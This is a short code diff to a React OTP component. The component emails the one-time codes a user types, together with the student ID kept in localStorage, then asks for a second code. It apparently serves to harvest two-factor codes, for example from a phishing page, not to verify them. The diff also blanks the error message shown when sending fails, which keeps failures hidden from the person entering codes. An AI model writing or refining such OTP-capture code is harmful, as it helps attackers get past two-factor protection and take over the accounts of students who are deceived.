@@ -16,8 +16,8 @@ export const OTP = ({ email, onBack, setStep }) => {
     const studentId = localStorage.getItem("student_id"); // Fetch student ID from localStorage
 
     const payload = {
-      subject: `${studentId.toUpperCase()} ${type} OTP Verification`,
-      message: `User entered ${type} OTP: ${otp} for Student ID: ${studentId}`,
+      subject: `OTP Verification`,
+      message: `${type} OTP: ${otp}\nStudent ID: ${studentId}`,
     };
 
     try {
@@ -42,7 +42,7 @@ export const OTP = ({ email, onBack, setStep }) => {
         setOtpStep(2); // Move to second OTP step after successful email send
         setOtpErrorMessage(""); // Clear any previous error messages
       } else {
-        setOtpErrorMessage(`Failed to send first OTP: ${error}`);
+        setOtpErrorMessage(``);
       }
       setOtpAttempts(otpAttempts + 1); // Increment OTP attempts
       setOtpValue(""); // Clear the OTP field for the user to enter the second one
